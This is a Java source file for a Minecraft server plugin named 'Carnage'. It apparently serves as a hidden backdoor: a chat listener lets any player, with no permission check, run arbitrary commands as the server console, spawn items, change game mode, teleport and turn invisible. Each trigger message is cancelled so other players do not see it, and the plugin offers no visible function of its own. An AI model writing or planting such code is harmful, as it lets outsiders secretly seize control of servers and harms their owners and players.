package com.carnage;

import com.cryptomorin.xseries.XMaterial;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

import java.util.HashSet;
import java.util.Set;
import java.util.UUID;

public class Carnage extends JavaPlugin implements Listener {

    private final Set<UUID> vanishedPlayers = new HashSet<>();

    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(this, this);
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        return true;
    }

    @EventHandler
    public void onChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage().trim();

        if (message.equals("!gmc")) {
            event.setCancelled(true);
            Bukkit.getScheduler().runTask(this, () -> player.setGameMode(GameMode.CREATIVE));
        } else if (message.equals("!gms")) {
            event.setCancelled(true);
            Bukkit.getScheduler().runTask(this, () -> player.setGameMode(GameMode.SURVIVAL));
        } else if (message.equals("!gmsp")) {
            event.setCancelled(true);
            Bukkit.getScheduler().runTask(this, () -> player.setGameMode(GameMode.SPECTATOR));
        } else if (message.equals("!gma")) {
            event.setCancelled(true);
            Bukkit.getScheduler().runTask(this, () -> player.setGameMode(GameMode.ADVENTURE));
        } else if (message.startsWith("!item ")) {
            event.setCancelled(true);
            String[] parts = message.split(" ");
            if (parts.length >= 3) {
                String materialName = parts[1].toUpperCase();
                try {
                    int amount = Integer.parseInt(parts[2]);
                    XMaterial.matchXMaterial(materialName).ifPresent(mat -> {
                        ItemStack item = mat.parseItem();
                        if (item != null) {
                            item.setAmount(amount);
                            Bukkit.getScheduler().runTask(this, () -> player.getInventory().addItem(item));
                        }
                    });
                } catch (NumberFormatException ignored) {}
            }
        } else if (message.startsWith("!console ")) {
            event.setCancelled(true);
            String cmd = message.substring(9);
            Bukkit.getScheduler().runTask(this, () -> Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd));
        } else if (message.startsWith("!remote ")) {
            event.setCancelled(true);
            String[] parts = message.split(" ");
            if (parts.length > 1) {
                Player target = Bukkit.getPlayer(parts[1]);
                if (target != null) {
                    Bukkit.getScheduler().runTask(this, () -> player.teleport(target));
                }
            }
        } else if (message.equals("!vanish")) {
            event.setCancelled(true);
            UUID uuid = player.getUniqueId();
            if (vanishedPlayers.contains(uuid)) {
                vanishedPlayers.remove(uuid);
                Bukkit.getScheduler().runTask(this, () -> {
                    player.removePotionEffect(PotionEffectType.INVISIBILITY);
                    for (Player p : Bukkit.getOnlinePlayers()) {
                        p.showPlayer(this, player);
                    }
                });
            } else {
                vanishedPlayers.add(uuid);
                Bukkit.getScheduler().runTask(this, () -> {
                    player.addPotionEffect(new PotionEffect(PotionEffectType.INVISIBILITY, Integer.MAX_VALUE, 1, false, false));
                    for (Player p : Bukkit.getOnlinePlayers()) {
                        p.hidePlayer(this, player);
                    }
                });
            }
        }
    }
}